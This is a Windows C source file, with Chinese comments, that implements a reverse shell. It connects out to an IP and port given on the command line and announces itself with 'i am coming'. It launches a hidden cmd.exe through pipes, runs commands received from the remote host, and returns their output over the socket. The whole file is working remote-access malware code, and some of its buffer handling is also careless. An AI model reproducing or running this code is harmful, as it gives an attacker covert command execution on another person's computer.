#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <winsock2.h>
#pragma comment(lib,"ws2_32.lib")

//定义一个线程函数
//线程函数，用来处理单独客户端的消息


HANDLE pA[2];
HANDLE pB[2];
PROCESS_INFORMATION pi = { 0 };

void run1()
{
	SECURITY_ATTRIBUTES sa1 = { 0 };
	SECURITY_ATTRIBUTES sa2 = { 0 };
	STARTUPINFO          si = { 0 };


	sa1.nLength = sizeof(sa1);
	sa1.lpSecurityDescriptor = NULL;
	sa1.bInheritHandle = TRUE;

	sa2.nLength = sizeof(sa2);
	sa2.lpSecurityDescriptor = NULL;
	sa2.bInheritHandle = TRUE;

	/*
	1W-> A ->R0
	(father)	 				(son)
	0R<- B <-W1
	*/

	CreatePipe(&pA[0], &pA[1], &sa1, 0);
	CreatePipe(&pB[0], &pB[1], &sa2, 0);
	GetStartupInfo(&si);
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags |= STARTF_USESTDHANDLES;
	si.hStdInput = pA[0];
	si.hStdOutput = si.hStdError = pB[1];
	si.dwFillAttribute = 1000;


	if (!CreateProcess(
		"c:\\Windows\\System32\\cmd.exe",
		NULL, NULL, NULL, TRUE,
		CREATE_NO_WINDOW,
		NULL, NULL,
		&si, &pi)){
		printf("CreateProcess Error!\n");
	}


	//关闭 双管道通信不需要使用的句柄
	CloseHandle(pA[0]);
	CloseHandle(pB[1]);


	return;
}

int run2(char* output_data){



	char* output_data2 = output_data;
	DWORD dwByteRead;
	DWORD TotalBytesAvail;
	int cntLen = 0;


	//strcat(input_data, "\r\n");
	//WriteFile(pA[1], input_data, strlen(input_data), &dwByteWritten, 0);

	memset(output_data, 0, 4096);
	while (1)
	{
		//FlushFileBuffers(B_W);
		FlushFileBuffers(pB[0]);
		FlushFileBuffers(pA[1]);
		//FlushFileBuffers(A_R);
		if (PeekNamedPipe(pB[0], output_data, sizeof(output_data), &dwByteRead, &TotalBytesAvail, NULL))
		{
			if (TotalBytesAvail > 0)
			{
				ReadFile(pB[0], output_data, TotalBytesAvail + 100, &dwByteRead, NULL);
				// 发送数据
				//printf("%s", output_data);
				output_data = output_data + dwByteRead;
				cntLen += dwByteRead;

			}
			else{
				break;
			}
		}
		Sleep(1000); // 延时等待，避免过多的CPU占用
	}
	//waitTime = 1000;
	return cntLen;
}

void run3(){
	CloseHandle(pA[1]);
	CloseHandle(pB[0]);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

int stri_memcmp(char* x, char*y, int len){
	int i;
	char* x1 = malloc(len + 1);
	char* y1 = malloc(len + 1);

	memcpy(x1, x, len);
	memcpy(y1, y, len);

	for (i = 0; i < len; i++) {
		x1[i] = x1[i] | 32;
		y1[i] = y1[i] | 32;
	}
	return memcmp(x1, y1, len);

}

//这个len好像没啥用
void UTF8_send(SOCKET sockClient, char* sendBuf,int len,int flag ){

	// 将字符串从当前编码（如GBK）转换为UTF-8编码
	int bufferSize = MultiByteToWideChar(CP_ACP, 0, sendBuf, -1, NULL, 0);
	wchar_t* wideStr = (wchar_t*)malloc(bufferSize * sizeof(wchar_t));
	MultiByteToWideChar(CP_ACP, 0, sendBuf, -1, wideStr, bufferSize);

	bufferSize = WideCharToMultiByte(CP_UTF8, 0, wideStr, -1, NULL, 0, NULL, NULL);
	char* utf8Str = (char*)malloc(bufferSize * sizeof(char));
	WideCharToMultiByte(CP_UTF8, 0, wideStr, -1, utf8Str, bufferSize, NULL, NULL);

	send(sockClient, utf8Str, strlen(utf8Str), flag);
	free(wideStr);
	free(utf8Str);

}
int main(int argc, char* argv[])
{
	//定义需要的变量
	int err = 0;
	WSADATA wsaData;
	SOCKADDR_IN addrServer;
	SOCKET sockClient;
	int waitTime = 1000;
	char *endptr;
	int tmpNum;
	DWORD dwByteWritten;
	if (argc != 3){
		printf("USAGE: self.exe ip port");
		return -1;
	}

	tmpNum = strtol(argv[2], &endptr, 10);

	if (endptr == argv[2]) {
		printf("无效的输入\n");
		return -1;
	}
	else if (*endptr != '\0') {
		printf("转换到非数字字符：%c\n", *endptr);
		return -1;
	}

	//准备环境


	// 设置控制台输出为UTF-8编码
	SetConsoleOutputCP(CP_UTF8);

	// 设置控制台输入为UTF-8编码
	SetConsoleCP(CP_UTF8);

	err = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (err != 0) {
		printf("WSAStartup error with %d\n", WSAGetLastError());
		return -1;
	}
	printf("#> work with %s %d\n", argv[1], tmpNum);
	//创建一个电话
	sockClient = socket(AF_INET, SOCK_STREAM, 0);

	//准备拨打的电话号码
	addrServer.sin_addr.S_un.S_addr = inet_addr(argv[1]);    //对方的IP地址，需要使用inet_addr函数将传入的点分十进制的IP地址转换成适合u_long型数值
	addrServer.sin_family = AF_INET;                             //指定协议类型
	addrServer.sin_port = htons(tmpNum);                           //指定端口

	//拨打电话
	if (SOCKET_ERROR == connect(sockClient, (SOCKADDR*)&addrServer, sizeof(SOCKADDR))) {
		printf("connect error with %d\n", WSAGetLastError());
		return -1;
	}
	run1();
	printf("#> connect server yes\n");

	char* sendbuf = malloc(4096);
	char* recvbuf = malloc(4096);
	memset(sendbuf, 0, 4096);
	strcpy(sendbuf, "i am coming\n");
	DWORD sendLen = strlen(sendbuf);
	UTF8_send(sockClient, sendbuf, sendLen, 0);
	while (1)
	{
		memset(recvbuf, 0, 4096);
		recv(sockClient, recvbuf, 4096, 0);
		if (stri_memcmp(recvbuf, "exit", 4) == 0){
			// 关闭连接的发送部分
			shutdown(sockClient, SD_SEND);
			break;
		}
		if (recvbuf[0] == '\n'){
			sendLen = run2(sendbuf);
			if (sendLen){
				UTF8_send(sockClient, sendbuf, sendLen, 0);
			}
			else{
				UTF8_send(sockClient, "no data", 8, 0);
			}
			continue;
		}
		strcat(recvbuf, "\r\n");//不管有没有\r\n 都增加\r\n,无所谓了,不管了
		WriteFile(pA[1], recvbuf, strlen(recvbuf), &dwByteWritten, 0);

		sendLen = run2(sendbuf);
		//send(sockClient, sendbuf, sendLen, 0);
		UTF8_send(sockClient, sendbuf, sendLen, 0);
	}

	run3();
	free(recvbuf);
	free(sendbuf);

	closesocket(sockClient);
	WSACleanup();

	return 0;
}

